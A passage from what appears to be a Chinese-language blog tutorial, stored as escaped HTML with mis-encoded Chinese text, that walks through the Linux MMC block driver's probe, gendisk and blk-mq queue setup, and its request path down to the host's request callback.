    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; device   *&lt;span&gt;parent;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; gendisk  *&lt;span&gt;disk;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_queue queue;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; list_head part;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; list_head rpmbs;

    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    flags;

    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    usage;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    read_only;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    part_type;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    reset_done;
    ... ...
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_blk_probe(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_blk_data *md, *&lt;span&gt;part_md;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; cap_str[&lt;span&gt;10&lt;/span&gt;&lt;span&gt;];

    ... ...
    card&lt;/span&gt;-&amp;gt;complete_wq = alloc_workqueue(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc_complete&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            WQ_MEM_RECLAIM &lt;/span&gt;| WQ_HIGHPRI, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆ†é…å’Œåˆå§‹åŒ–gendiskç»“æ„ï¼Œåˆå§‹åŒ–è¯·æ±‚é˜Ÿåˆ—&lt;/span&gt;
    md =&lt;span&gt; mmc_blk_alloc(card);

    string_get_size((u64)get_capacity(md&lt;/span&gt;-&amp;gt;disk), &lt;span&gt;512&lt;/span&gt;&lt;span&gt;, STRING_UNITS_2,
            cap_str, &lt;/span&gt;&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(cap_str));

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_blk_alloc_parts(card, md))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    dev_set_drvdata(&lt;/span&gt;&amp;amp;card-&amp;gt;&lt;span&gt;dev, md);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; æ·»åŠ gendisk&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_add_disk(md))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    list_for_each_entry(part_md, &lt;/span&gt;&amp;amp;md-&amp;gt;&lt;span&gt;part, part) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_add_disk(part_md))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
    }

    ...
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_probe(card)&lt;/span&gt;Â ä¸ºMMC cardå®Œæˆæ‰€æœ‰å—è®¾å¤‡é©±åŠ¨æœ‰å…³çš„å·¥ä½œï¼Œä¸»è¦è°ƒç”¨äº†ä¸¤ä¸ªé‡è¦çš„å‡½æ•°ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_alloc(card)&lt;/span&gt;Â &lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_disk(md)&lt;/span&gt;Â &lt;br/&gt;&lt;/code&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;52-mmc_blk_alloccard&quot;&gt;&lt;span&gt;5.2 mmc_blk_alloc(card)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_alloc(card)&lt;/span&gt;Â ä¸ºMMC cardåˆå§‹åŒ–è¯·æ±‚é˜Ÿåˆ—ï¼Œå‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸ºï¼š&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;30&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
mmc_blk_alloc(card) --&amp;gt; mmc_blk_alloc_req() --&amp;gt; mmc_init_queue(&amp;amp;md-&amp;gt;queue, card) --&amp;gt; blk_mq_init_queue()
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_blk_data *mmc_blk_alloc(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    sector_t size;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!mmc_card_sd(card) &amp;amp;&amp;amp;&lt;span&gt; mmc_card_blockaddr(card)) {
        size &lt;/span&gt;= card-&amp;gt;&lt;span&gt;ext_csd.sectors;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        size &lt;/span&gt;= (&lt;span&gt;typeof&lt;/span&gt;(sector_t))card-&amp;gt;csd.capacity &amp;lt;&amp;lt; (card-&amp;gt;csd.read_blkbits - &lt;span&gt;9&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; mmc_blk_alloc_req(card, &amp;amp;card-&amp;gt;dev, size, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;, NULL, MMC_BLK_DATA_AREA_MAIN);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; block_device_operations mmc_bdops =&lt;span&gt; {
    .open           &lt;/span&gt;=&lt;span&gt; mmc_blk_open,
    .release        &lt;/span&gt;=&lt;span&gt; mmc_blk_release,
    .getgeo         &lt;/span&gt;=&lt;span&gt; mmc_blk_getgeo,
    .owner          &lt;/span&gt;=&lt;span&gt; THIS_MODULE,
    .ioctl          &lt;/span&gt;=&lt;span&gt; mmc_blk_ioctl,
#ifdef CONFIG_COMPAT
    .compat_ioctl       &lt;/span&gt;=&lt;span&gt; mmc_blk_compat_ioctl,
&lt;/span&gt;&lt;span&gt;#endif&lt;/span&gt;&lt;span&gt;
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_blk_data *mmc_blk_alloc_req(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; device *parent,  sector_t size,  &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; default_ro,
        &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; *subname,  &lt;span&gt;int&lt;/span&gt;&lt;span&gt; area_type)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_blk_data *&lt;span&gt;md;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; devidx, ret;

    devidx &lt;/span&gt;= ida_simple_get(&amp;amp;mmc_blk_ida, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, max_devices, GFP_KERNEL);
    ... ...
    md &lt;/span&gt;= kzalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_blk_data), GFP_KERNEL);

    md&lt;/span&gt;-&amp;gt;area_type =&lt;span&gt; area_type;

    md&lt;/span&gt;-&amp;gt;read_only =&lt;span&gt; mmc_blk_readonly(card);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆ†é…gendiskç»“æ„ &lt;/span&gt;
    md-&amp;gt;disk =&lt;span&gt; alloc_disk(perdev_minors);

    INIT_LIST_HEAD(&lt;/span&gt;&amp;amp;md-&amp;gt;&lt;span&gt;part);
    INIT_LIST_HEAD(&lt;/span&gt;&amp;amp;md-&amp;gt;&lt;span&gt;rpmbs);
    md&lt;/span&gt;-&amp;gt;usage = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆå§‹åŒ–è¯·æ±‚é˜Ÿåˆ— &lt;/span&gt;
    ret = mmc_init_queue(&amp;amp;md-&amp;gt;&lt;span&gt;queue, card);

    md&lt;/span&gt;-&amp;gt;queue.blkdata =&lt;span&gt; md;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆå§‹åŒ–gendiskç»“æ„æˆå‘˜&lt;/span&gt;
    md-&amp;gt;disk-&amp;gt;major =&lt;span&gt; MMC_BLOCK_MAJOR;
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;first_minor = devidx *&lt;span&gt; perdev_minors;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ä¸ºMMC cardå®šä¹‰äº†block_device_operationsç»“æ„ä½“&lt;/span&gt;
    md-&amp;gt;disk-&amp;gt;fops = &amp;amp;&lt;span&gt;mmc_bdops;
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;private_data =&lt;span&gt; md;
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;queue = md-&amp;gt;&lt;span&gt;queue.queue;
    md&lt;/span&gt;-&amp;gt;parent =&lt;span&gt; parent;
    set_disk_ro(md&lt;/span&gt;-&amp;gt;disk, md-&amp;gt;read_only ||&lt;span&gt; default_ro);
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;flags =&lt;span&gt; GENHD_FL_EXT_DEVT;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (area_type &amp;amp; (MMC_BLK_DATA_AREA_RPMB |&lt;span&gt; MMC_BLK_DATA_AREA_BOOT))
        md&lt;/span&gt;-&amp;gt;disk-&amp;gt;flags |= GENHD_FL_NO_PART_SCAN |&lt;span&gt; GENHD_FL_SUPPRESS_PARTITION_INFO;

    snprintf(md&lt;/span&gt;-&amp;gt;disk-&amp;gt;disk_name, &lt;span&gt;sizeof&lt;/span&gt;(md-&amp;gt;disk-&amp;gt;&lt;span&gt;disk_name),
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmcblk%u%s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, card-&amp;gt;host-&amp;gt;index, subname ? subname : &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;);

    set_capacity(md&lt;/span&gt;-&amp;gt;&lt;span&gt;disk, size);

    ... ...
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; md;
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_alloc_req()&lt;/span&gt;Â å‡½æ•°ä¸­ä¸ºå°†MMC card gendiskç»“æ„ä½“çš„fopsèµ‹å€¼ä¸ºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bdops&lt;/span&gt;Â ï¼Œå³ä¸ºMMC cardå®šä¹‰äº†Â &lt;span class=&quot;cnblogs_code&quot;&gt;open&lt;/span&gt;Â ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;release&lt;/span&gt;Â ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;getgeo&lt;/span&gt;Â ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;ioctl&lt;/span&gt;Â ç­‰æ“ä½œçš„å›è°ƒå‡½æ•°ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;53-mmc_init_queuemd-queue-card&quot;&gt;&lt;span&gt;5.3 mmc_init_queue(&amp;amp;md-&amp;gt;queue, card)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;24&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; blk_mq_ops mmc_mq_ops =&lt;span&gt; {
    .queue_rq       &lt;/span&gt;=&lt;span&gt; mmc_mq_queue_rq,
    .init_request   &lt;/span&gt;=&lt;span&gt; mmc_mq_init_request,
    .exit_request   &lt;/span&gt;=&lt;span&gt; mmc_mq_exit_request,
    .complete       &lt;/span&gt;=&lt;span&gt; mmc_blk_mq_complete,
    .timeout        &lt;/span&gt;=&lt;span&gt; mmc_mq_timed_out,
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; mmc_init_queue(&lt;span&gt;struct&lt;/span&gt; mmc_queue *mq, &lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *host = card-&amp;gt;&lt;span&gt;host;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; ret;

    mq&lt;/span&gt;-&amp;gt;card =&lt;span&gt; card;
    mq&lt;/span&gt;-&amp;gt;use_cqe = host-&amp;gt;&lt;span&gt;cqe_enabled;

    spin_lock_init(&lt;/span&gt;&amp;amp;mq-&amp;gt;&lt;span&gt;lock&lt;/span&gt;&lt;span&gt;);

    memset(&lt;/span&gt;&amp;amp;mq-&amp;gt;tag_set, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;sizeof&lt;/span&gt;(mq-&amp;gt;&lt;span&gt;tag_set));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; mq-&amp;gt;tag_set.opsè®¾ç½®ä¸ºmmc_mq_ops&lt;/span&gt;
    mq-&amp;gt;tag_set.ops = &amp;amp;&lt;span&gt;mmc_mq_ops;
    ... ...
    mq&lt;/span&gt;-&amp;gt;tag_set.driver_data =&lt;span&gt; mq;

    ret &lt;/span&gt;= blk_mq_alloc_tag_set(&amp;amp;mq-&amp;gt;&lt;span&gt;tag_set);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆå§‹åŒ–è¯·æ±‚é˜Ÿåˆ—&lt;/span&gt;
    mq-&amp;gt;queue = blk_mq_init_queue(&amp;amp;mq-&amp;gt;&lt;span&gt;tag_set);

    ... ...
    mq&lt;/span&gt;-&amp;gt;queue-&amp;gt;queuedata =&lt;span&gt; mq;
    blk_queue_rq_timeout(mq&lt;/span&gt;-&amp;gt;queue, &lt;span&gt;60&lt;/span&gt; *&lt;span&gt; HZ);

    mmc_setup_queue(mq, card);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; request_queue *blk_mq_init_queue(&lt;span&gt;struct&lt;/span&gt; blk_mq_tag_set *&lt;span&gt;set&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request_queue *uninit_q, *&lt;span&gt;q;

    uninit_q &lt;/span&gt;= blk_alloc_queue_node(GFP_KERNEL, &lt;span&gt;set&lt;/span&gt;-&amp;gt;&lt;span&gt;numa_node);
    q &lt;/span&gt;= blk_mq_init_allocated_queue(&lt;span&gt;set&lt;/span&gt;&lt;span&gt;, uninit_q);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; q;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; request_queue *blk_mq_init_allocated_queue(&lt;span&gt;struct&lt;/span&gt; blk_mq_tag_set *&lt;span&gt;set&lt;/span&gt;&lt;span&gt;,
                          &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request_queue *&lt;span&gt;q)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ç”¨set-&amp;gt;ops (mmc_mq_ops)æ¥åˆå§‹åŒ–request_queueçš„mq_opsæˆå‘˜&lt;/span&gt;
    q-&amp;gt;mq_ops = &lt;span&gt;set&lt;/span&gt;-&amp;gt;&lt;span&gt;ops;
    ... ...
    blk_queue_make_request(q, blk_mq_make_request);
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_queue(&amp;amp;md-&amp;gt;queue, card)&lt;/span&gt;Â æœ€ç»ˆè°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;blk_queue_make_request(q, blk_mq_make_request)&lt;/span&gt;Â åˆå§‹åŒ–äº†è¯·æ±‚é˜Ÿåˆ—ï¼ˆåˆ¶é€ è¯·æ±‚å‡½æ•°ï¼‰ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt;å¦å¤–ï¼Œä¹Ÿä½¿ç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_ops&lt;/span&gt;Â åˆå§‹åŒ–äº†Â &lt;span class=&quot;cnblogs_code&quot;&gt;request_queue&lt;/span&gt;Â çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;mq_ops&lt;/span&gt;Â æˆå‘˜ï¼Œä¸‹æ–‡ä¼šæåˆ°ã€‚&lt;br/&gt;è‡³æ­¤ï¼Œå—è®¾å¤‡é©±åŠ¨æ³¨å†Œå·¥ä½œåŸºæœ¬å®Œæˆã€‚&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;4.1èŠ‚ä»‹ç»MMXè®¾å¤‡åˆå§‹åŒ–æ—¶æåˆ°ï¼Œé©±åŠ¨ç¼–å†™è¿‡ç¨‹ä¸­ç‰¹åˆ«åœ°ä¸ºhostç¼–å†™äº†Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_ops&lt;/span&gt;Â ï¼Œè€Œè‡³ç›®å‰ä»æœªä»‹ç»åˆ°å…¶è¢«ä½¿ç”¨çš„åœ°æ–¹ï¼Œæœ¬èŠ‚å°†ä»è¯·æ±‚é˜Ÿåˆ—å…¥æ‰‹ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„æƒ…å½¢ï¼Œåˆ†æÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_ops&lt;/span&gt;Â æ“ä½œå‡½æ•°çš„å›è°ƒè¿‡ç¨‹ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;å½“å¯¹mmc cardå‘èµ·å—è®¾å¤‡I/OåŠ¨ä½œæ—¶ï¼Œå†…æ ¸ä¼šé¦–å…ˆè°ƒç”¨åˆ°ä¹‹å‰åˆå§‹åŒ–çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;blk_mq_make_request()&lt;/span&gt;Â å‡½æ•°ï¼ˆå®šä¹‰åœ¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;block/blk-mq.c&lt;/span&gt;Â ï¼‰ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;blk_mq_try_issue_directly()&lt;/span&gt;Â ï¼Œæœ€ç»ˆä¸€æ­¥æ­¥è°ƒç”¨åˆ°Â &lt;span class=&quot;cnblogs_code&quot;&gt;__blk_mq_issue_directly()&lt;/span&gt;Â ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;44&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_qc_t blk_mq_make_request(&lt;span&gt;struct&lt;/span&gt; request_queue *q, &lt;span&gt;struct&lt;/span&gt; bio *&lt;span&gt;bio)
{
    ...
    blk_mq_try_issue_directly(data.hctx, rq, &lt;/span&gt;&amp;amp;&lt;span&gt;cookie);
    ..
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; blk_mq_try_issue_directly(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *rq, blk_qc_t *&lt;span&gt;cookie)
{
    ...
    ret &lt;/span&gt;= __blk_mq_try_issue_directly(hctx, rq, cookie, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ret == BLK_STS_RESOURCE || ret ==&lt;span&gt; BLK_STS_DEV_RESOURCE)
        blk_mq_request_bypass_insert(rq, &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (ret !=&lt;span&gt; BLK_STS_OK)
        blk_mq_end_request(rq, ret);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_status_t __blk_mq_try_issue_directly(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *rq, blk_qc_t *cookie, &lt;span&gt;bool&lt;/span&gt; bypass_insert, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; last)
{
    ... 
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; __blk_mq_issue_directly(hctx, rq, cookie, last);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_status_t __blk_mq_issue_directly(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *rq, blk_qc_t *cookie, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; last)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request_queue *q = rq-&amp;gt;&lt;span&gt;q;
    ... 
    ret &lt;/span&gt;= q-&amp;gt;mq_ops-&amp;gt;queue_rq(hctx, &amp;amp;&lt;span&gt;bd);
    ... 
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;5.3ä¸€èŠ‚ä¸­æåˆ°Â &lt;span class=&quot;cnblogs_code&quot;&gt;q-&amp;gt;mq_ops&lt;/span&gt;Â æŒ‡å‘Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_ops&lt;/span&gt;Â ï¼Œå› æ­¤æ­¤å¤„æœ€ç»ˆä¼šå›è°ƒå‡½æ•°Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_ops-&amp;gt;queue_rq()&lt;/span&gt;Â ï¼Œå³Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_queue_rq()&lt;/span&gt;Â ï¼Œæœ€ç»ˆå›è°ƒè‡³Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_ops-&amp;gt;request(host, mrq)&lt;/span&gt;Â ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
mmc_mq_queue_rq() --&amp;gt; mmc_blk_mq_issue_rq() --&amp;gt; mmc_blk_mq_issue_rw_rq() --&amp;gt;&lt;span&gt; mmc_start_request() &lt;/span&gt;--&amp;gt; __mmc_start_request() --&amp;gt; host-&amp;gt;ops-&amp;gt;request(host, mrq)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_status_t mmc_mq_queue_rq(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
                    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; blk_mq_queue_data *&lt;span&gt;bd)
{
    ...
    issued &lt;/span&gt;=&lt;span&gt; mmc_blk_mq_issue_rq(mq, req);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;enum&lt;/span&gt; mmc_issued mmc_blk_mq_issue_rq(&lt;span&gt;struct&lt;/span&gt; mmc_queue *mq, &lt;span&gt;struct&lt;/span&gt; request *&lt;span&gt;req)
{
    ...
    ret &lt;/span&gt;=&lt;span&gt; mmc_blk_mq_issue_rw_rq(mq, req);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_blk_mq_issue_rw_rq(&lt;span&gt;struct&lt;/span&gt; mmc_queue *&lt;span&gt;mq,
                  &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *&lt;span&gt;req)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_queue_req *mqrq =&lt;span&gt; req_to_mmc_queue_req(req);
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *host = mq-&amp;gt;card-&amp;gt;&lt;span&gt;host;
    ... ...

    err &lt;/span&gt;= mmc_start_request(host, &amp;amp;mqrq-&amp;gt;&lt;span&gt;brq.mrq);

    ... ...
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; err;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;int&lt;/span&gt; mmc_start_request(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, &lt;span&gt;struct&lt;/span&gt; mmc_request *&lt;span&gt;mrq)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;

    init_completion(&lt;/span&gt;&amp;amp;mrq-&amp;gt;&lt;span&gt;cmd_completion);

    mmc_retune_hold(host);

    ...
    WARN_ON(&lt;/span&gt;!host-&amp;gt;&lt;span&gt;claimed);

    err &lt;/span&gt;=&lt;span&gt; mmc_mrq_prep(host, mrq);
    ...

    __mmc_start_request(host, mrq);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; __mmc_start_request(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, &lt;span&gt;struct&lt;/span&gt; mmc_request *&lt;span&gt;mrq)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    ...
